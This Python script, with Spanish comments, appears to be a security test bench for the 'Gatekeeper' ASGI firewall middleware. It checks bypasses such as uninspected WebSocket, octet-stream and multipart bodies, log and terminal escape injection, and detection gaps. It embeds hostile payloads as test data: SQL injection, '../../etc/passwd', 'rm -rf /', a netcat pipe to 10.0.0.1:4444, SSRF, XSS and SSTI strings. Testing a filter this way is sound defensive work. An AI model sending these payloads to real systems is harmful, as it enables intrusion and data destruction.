"""Banco de ataque: comprueba, uno a uno, los hallazgos del informe previo
y de paso caza bypasses que no estan en ese informe.

No modifica el repo: solo hace peticiones ASGI en memoria y mide.
"""
from __future__ import annotations

import io
import json
import logging
import os
import subprocess
import sys
import tempfile
import time
import tracemalloc

sys.path.insert(0, r"D:\ADEV\ProyectosVScode\Gatekeeper\gatekeeper-v0.3\gatekeeper\src")

from starlette.applications import Starlette
from starlette.responses import PlainTextResponse
from starlette.routing import Route, WebSocketRoute
from starlette.testclient import TestClient

from gatekeeper import Config, GatekeeperMiddleware
from gatekeeper.body import extract_strings
from gatekeeper.ratelimit import MemoryBackend
from gatekeeper.rules import scan, scan_detailed

OK, KO, INFO = "OK  ", "FALLO", "INFO"
results: list[tuple[str, str, str]] = []


def record(status: str, name: str, detail: str = "") -> None:
    results.append((status, name, detail))
    print(f"[{status}] {name}" + (f"\n        {detail}" if detail else ""))


def make_client(**cfg):
    async def home(request):
        return PlainTextResponse("ok")

    async def ws(websocket):
        await websocket.accept()
        await websocket.send_text("hello")
        await websocket.close()

    app = Starlette(routes=[
        Route("/", home, methods=["GET", "POST", "PUT", "PATCH", "DELETE"]),
        Route("/echo", home, methods=["GET", "POST", "PUT", "PATCH", "DELETE"]),
        WebSocketRoute("/ws", ws),
    ])
    app.add_middleware(GatekeeperMiddleware, config=Config(**cfg))
    return TestClient(app)


# ---------------------------------------------------------------- 1. WebSocket
def test_websocket():
    c = make_client(rate_limit=1, rate_window=60)
    aceptadas = 0
    handshake_ataque = None
    for _ in range(6):
        try:
            with c.websocket_connect("/ws?q=union%20select%20password%20from%20users"):
                aceptadas += 1
        except Exception as exc:  # noqa: BLE001
            handshake_ataque = f"{type(exc).__name__}: {exc}"
            break
    if aceptadas >= 2:
        record(KO, "WebSocket: handshake con SQLi + rate limit evadido",
               f"{aceptadas}/6 conexiones aceptadas (rate_limit=1). "
               f"payload 'union select password from users' NO inspeccionado. "
               f"middleware.py:175 sale temprano si scope['type'] != 'http'.")
    else:
        record(OK, "WebSocket: protegido",
               f"solo {aceptadas} conexion(es) aceptada(s). {handshake_ataque}")


# ---------------------------------------------------- 2. application/octet-stream
def test_octet_stream():
    c = make_client()
    payload = json.dumps({"q": "union select password from users"}).encode()
    r = c.post("/echo", content=payload,
               headers={"content-type": "application/octet-stream"})
    if r.status_code == 200:
        record(KO, "application/octet-stream: body NO inspeccionado",
               "Un JSON con SQLi enviado como octet-stream pasa con 200. "
               "body.py:20 lo marca como binario y is_inspectable() lo salta. "
               "Una app con await request.json() lo parsea igual.")
    else:
        record(OK, "application/octet-stream: inspeccionado", f"status={r.status_code}")

    # control: el mismo JSON como text/plain SI se inspecciona
    r2 = c.post("/echo", content=payload, headers={"content-type": "text/plain"})
    record(OK if r2.status_code == 403 else KO,
           "control: text/plain SI inspeccionado", f"status={r2.status_code}")


# ------------------------------------------------------------- 3. multipart
def test_multipart():
    c = make_client()
    files = {"f": ("../../etc/passwd", io.BytesIO(b"union select password from users"), "text/plain")}
    data = {"campo": "union select password from users"}
    r = c.post("/echo", data=data, files=files)
    if r.status_code == 200:
        record(KO, "multipart/form-data: body NO inspeccionado",
               "filename=../../etc/passwd y campo con SQLi pasan con 200. "
               "body.py:40 devuelve False para multipart/form-data.")
    else:
        record(OK, "multipart: inspeccionado", f"status={r.status_code}")


# ------------------------------------------- 4. punteros JSON > 64 niveles
def test_pointer_depth():
    profundidad = 80
    obj = {"payload": "union select password from users"}
    for _ in range(profundidad):
        obj = {"n": obj}
    body = json.dumps(obj).encode()
    campos = extract_strings("application/json", body)
    punteros = [p for p, _ in campos]
    ultimo = [p for p in punteros if p.endswith("/payload")]
    detalle = (f"punteros generados={len(punteros)}; "
               f"¿aparece '/payload' como ultimo segmento? {bool(ultimo)}")
    if not ultimo:
        record(KO, "Puntero JSON profundo (>64): atribucion perdida",
               detalle + ". body.py:203 _child_pointer() no anade el segmento al "
                        "llegar al limite, asi que el campo real que salto no aparece.")
    else:
        record(OK, "Puntero JSON profundo: atribucion correcta", detalle)

    # exclude_fields no casa -> falso positivo
    cfg = Config(exclude_fields=["payload"])
    campos = extract_strings("application/json", body)
    excluido = any(cfg.field_excluded(p) for p, v in campos if v == "union select password from users")
    record(OK if excluido else KO,
           "exclude_fields con JSON profundo (>64 niveles)",
           f"el campo excluido 'payload' se reconoce: {excluido}")


# ------------------------------------------------ 5. memoria del rate limiter
def test_ratelimit_memory():
    backend = MemoryBackend(limit=100, window=60.0)
    tracemalloc.start()
    base = tracemalloc.get_traced_memory()[0]
    inicio = time.perf_counter()
    n = 300_000
    import asyncio
    async def fill():
        for i in range(n):
            await backend.allow(f"ip-{i}")
    asyncio.run(fill())
    pico = tracemalloc.get_traced_memory()[1]
    tracemalloc.stop()
    mb = (pico - base) / 1024 / 1024
    claves = len(backend._hits)
    record(KO if claves == n else OK,
           "MemoryBackend: sin tope de claves",
           f"{claves} IPs distintas en memoria = {mb:.1f} MB en {time.perf_counter()-inicio:.1f}s "
           f"({mb*1024*1024/max(claves,1):.0f} bytes por IP). "
           "MemoryBackend._hits solo poda claves VIEJAS cada 1000 llamadas (ratelimit.py:103).")


# ------------------------------------------------------- 6. fugas en el log
def test_log_leak():
    registros = []

    class Handler(logging.Handler):
        def emit(self, record):
            registros.append(record.getMessage())

    logger = logging.getLogger("gatekeeper")
    logger.setLevel(logging.WARNING)
    h = Handler()
    logger.addHandler(h)
    try:
        c = make_client(monitor_only=True, rate_limit=0)
        # 1) ruta controlada por el atacante + payload que dispara deteccion
        c.get("/buscar%1b%5B2J?q=union%20select%20password%20from%20users")
        # 2) clave JSON controlada por el atacante + payload que dispara deteccion
        c.post("/echo", json={"clave\u001b[31m": "union select password from users"})
        # 3) ruta normal + payload en la query
        c.get("/normal?q=union%20select%20password%20from%20users")
    finally:
        logger.removeHandler(h)

    eventos = [json.loads(line) for line in registros if line.startswith("{")]
    paths = [e.get("path") for e in eventos]
    fields = [e.get("field") for e in eventos]
    tiene_path = any(p for p in paths)
    tiene_field = any(f for f in fields)
    escapes = any("\x1b" in str(p) or "\x1b" in str(f) for p, f in zip(paths, fields))
    record(KO if (tiene_path and tiene_field) else OK,
           "El log incluye datos controlados por el atacante",
           f"eventos={len(eventos)}; path={paths}; field={fields}; "
           f"contiene ESC sin escapar: {escapes}. "
           "middleware.py:140-154 dice 'Nunca se registra el contenido del payload', "
           "pero escribe la ruta completa y las claves JSON (controladas por el atacante).")


# ------------------------------------------- 7. escape de terminal en el CLI
def test_cli_terminal_injection():
    log = (
        '{"event": "attack_detected", "rule": "sqli", "source": "query", '
        '"field": "q", "path": "/x\\u001b[2J\\u001b]0;payload\\u0007", "pattern": "or"}'
    )
    with tempfile.NamedTemporaryFile("w", suffix=".log", delete=False, encoding="utf-8") as fh:
        fh.write(log + "\n")
        ruta = fh.name
    try:
        proc = subprocess.run(
            [sys.executable, "-m", "gatekeeper.cli", "report", ruta],
            capture_output=True,
        )
        salida = proc.stdout
        tiene_esc = b"\x1b" in salida
        tiene_bel = b"\x07" in salida
        record(KO if (tiene_esc or tiene_bel) else OK,
               "CLI 'gatekeeper report': escape de terminal",
               f"ESC en la salida: {tiene_esc}; BEL: {tiene_bel}. "
               "cli.py:98-99 mete 'path'/'field' del log en el informe sin sanear; "
               "json.loads decodifica \\u001b a un ESC real.")
    finally:
        os.unlink(ruta)


def test_cli_acceso_generico():
    """El segundo formato que acepta 'gatekeeper report' (log de acceso) es aun mas directo."""
    with tempfile.NamedTemporaryFile("w", suffix=".log", delete=False, encoding="utf-8") as fh:
        fh.write("GET /salida\x1b[2J\x1b]0;robo?q=union%20select%201 200\n")
        ruta = fh.name
    try:
        proc = subprocess.run(
            [sys.executable, "-m", "gatekeeper.cli", "report", ruta],
            capture_output=True,
        )
        tiene_esc = b"\x1b" in proc.stdout
        record(KO if tiene_esc else OK,
               "CLI 'gatekeeper report' con log de acceso: escape de terminal",
               f"ESC en la salida: {tiene_esc}. El formato generico no pasa por json.loads, "
               "asi que los bytes de control llegan intactos a la terminal.")
    finally:
        os.unlink(ruta)


# ------------------------------------------------ 8. falsos negativos y positivos
def test_deteccion():
    FNs = {
        "SQLi tautologia con comillas vacias": "' or ''=",
        "SQLi booleano a ciegas (substring)": "substring(version(),1,1)=5",
        "SQLi tautologia basica": "' or '1'='1",
        "cmd con salto de linea": "foo\n; cat /etc/passwd",
        "SSRF con IP decimal": "http://2130706433/admin",
        "SSRF con IP octal/hex": "http://0x7f000001/admin",
        "NoSQL con $ne": '{"$ne": null}',
        "CRLF en header": "x%0d%0aSet-Cookie:%20a=b",
        "XSS con onerror": "<img src=x onerror=alert(1)>",
        "SSTI Jinja": "{{7*7}}",
    }
    for nombre, payload in FNs.items():
        hit = scan(payload)
        record(KO if hit is None else OK, f"FN: {nombre}",
               f"payload={payload!r} -> detectado como {hit!r}")

    # el salto de linea en cmd: hay que mirar la familia cmdi sola, porque
    # /etc/passwd hace que gane path_traversal antes (RULES se evalua en orden).
    solo_cmdi = scan_detailed("foo\n; whoami", only={"cmdi"})
    record(KO if solo_cmdi is None else OK,
           "FN: cmd con salto de linea (familia cmdi aislada)",
           f"payload='foo\\n; whoami' -> cmdi={solo_cmdi}")

    # inyeccion de comando con salto de linea dentro del comando
    for variante in ("foo\nrm -rf /", "foo\r\n; id", "a\n| nc 10.0.0.1 4444"):
        solo = scan_detailed(variante, only={"cmdi"})
        record(KO if solo is None else OK, f"FN: cmd variante {variante!r}",
               f"-> cmdi={solo}")

    FPs = {
        "script en prosa": "el tutorial explica como usar <script> en una pagina",
        "1=1 en matematicas": "si 1=1 en matematicas entonces la ecuacion es correcta",
        "sleep(8 hours) en prosa": "la funcion sleep(8 hours) pausa el programa",
        "union en un articulo": "el sindicalismo unido union workers",
    }
    for nombre, texto in FPs.items():
        hit = scan(texto)
        record(KO if hit is not None else OK, f"FP: {nombre}",
               f"texto={texto!r} -> detectado como {hit!r}")


# ------------------------------------------ 9. claves JSON duplicadas
def test_claves_duplicadas():
    body = b'{"a": "union select password from users", "a": "seguro"}'
    campos = extract_strings("application/json", body)
    valores = [v for _, v in campos]
    record(INFO, "Claves JSON duplicadas",
           f"json.loads se queda con la ULTIMA: valores inspeccionados={valores}. "
           "Starlette/FastAPI tambien usan json.loads, asi que no hay discrepancia "
           "con el parser estandar (riesgo real solo con parsers que toman la primera).")


# ------------------------------------------ 10. metodos HTTP sin inspeccion de body
def test_metodos():
    c = make_client()
    r = c.request("GET", "/echo", content=b"union select password from users",
                  headers={"content-type": "text/plain"})
    record(INFO, "GET con body: no se inspecciona",
           f"status={r.status_code}. BODY_METHODS={sorted({'POST','PUT','PATCH','DELETE'})} "
           "excluye GET/HEAD/OPTIONS (middleware.py:27).")


def main() -> None:
    import time
    print("=" * 78)
    print("BANCO DE ATAQUE - Gatekeeper 0.4.0 (codigo del repo, sin el parche)")
    print("=" * 78)
    test_websocket()
    test_octet_stream()
    test_multipart()
    test_pointer_depth()
    test_ratelimit_memory()
    test_log_leak()
    test_cli_terminal_injection()
    test_cli_acceso_generico()
    test_deteccion()
    test_claves_duplicadas()
    test_metodos()
    print()
    print("=" * 78)
    fallos = sum(1 for s, _, _ in results if s == KO)
    oks = sum(1 for s, _, _ in results if s == OK)
    infos = sum(1 for s, _, _ in results if s == INFO)
    print(f"RESUMEN: {fallos} hallazgos, {oks} controles correctos, {infos} notas")
    print("=" * 78)


if __name__ == "__main__":
    main()
